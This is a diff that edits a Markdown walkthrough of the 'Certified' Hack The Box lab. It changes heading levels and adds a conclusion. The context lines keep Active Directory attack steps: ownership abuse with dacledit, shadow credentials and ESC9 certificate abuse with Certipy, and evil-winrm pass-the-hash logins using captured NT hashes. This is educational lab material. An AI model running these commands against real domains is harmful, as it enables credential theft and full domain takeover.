@@ -105,7 +105,7 @@ WINRM       10.10.11.41     5985   DC01             [-] certified.htb\judith.mad
 WinRM does not work,that means we have to work with user low privileges.
 
 
-### SMB Enumeration
+## SMB Enumeration
 
 
 Let's take a look to SMB service
@@ -171,7 +171,7 @@ Our user has `WriteOwner` rights on `MANAGEMENT@CERTFIED.HTB` group.So I'll go f
 
 Click on the edge in BloodHound from Judith.Mader to Management group.There is section how to abuse with Linux
 
-### Modyfing rights
+## Modyfing rights
 
 To change the ownership of the object, you may use Impacket's dacledit example script (cf. "grant ownership" reference for the exact link).
 ```text
@@ -196,7 +196,7 @@ CERTIFIED\judith.mader
 CERTIFIED\management_svc
 ```
 
-### Abusing `MANAGEMENT_SVC`
+## Abusing `MANAGEMENT_SVC`
 
 
 
@@ -228,7 +228,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```
 Now I got `management_svc` NT hash
 
-### WinRM as `MANAGEMENT_SVC` group
+## WinRM as `MANAGEMENT_SVC` group
 
 ```text
 evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
@@ -240,7 +240,7 @@ Info: Establishing connection to remote endpoint
 5b5f382a************************
 ```
 
-### Authentication as "CA_SVC"
+## Authentication as "CA_SVC"
 
 I have `GenericAll` over `CA_SVC`,so I can `Shadow Credential` as you can see above, where we can Shadow credentials for `Management_SVC`
 
@@ -275,7 +275,7 @@ WINRM       10.10.11.41     5985   DC01             [-] certified.htb\ca_operato
 
 As you can see, we can't auth as `CA_OPERATOR`.So I didn't find any other way.In this situation I always prefer to use `certipy` for enumerating ADCS
 
-### Enumeration ADCS
+## Enumeration ADCS
 
 ```test
 certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
@@ -358,7 +358,7 @@ Certificate Templates
       ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
 ```
 
-### ESC9 Vulnerbility 
+## ESC9 Vulnerbility 
 
 ESC9 is an enumeration/abuse pattern against Active Directory Certificate Services (AD CS) where an attacker who controls or can modify Certificate Authority (CA) objects, certificate templates, or enrollment permissions can obtain a certificate that effectively grants the attacker the privileges of a high-value account (for example a Domain Admin). Because certificates issued by a trusted enterprise CA are accepted for authentication (PKINIT, smartcard logon, or certain service authentications), abusing AD CS in this way is a reliable escalation path to full domain compromise.
 
@@ -433,9 +433,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
 ```
 
-### Auth as Administrator
+## Auth as Administrator
 
-Now I finally got Administrator access
+Now I finally have Administrator access
 
 ```text
 evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
@@ -448,7 +448,6 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
+## Conclusion
 
-
-
-
+The Certified box demonstrates a common and realistic Active Directory escalation chain: a low-privilege service account (management_svc) with write/modify rights over higher-value objects can be leveraged to abuse AD Certificate Services and obtain full domain control. In this engagement we moved from an initial foothold on management_svc to control over CA-related objects, used that control to request/issue a certificate for a privileged identity (AD CS / ESC9 abuse), and then leveraged that certificate to authenticate as a high-privilege account and perform domain-level actions (including DCSync). Compared to purely “graphical” BloodHound paths, the AD CS route here was the most practical and reliable escalation vector in the target environment.
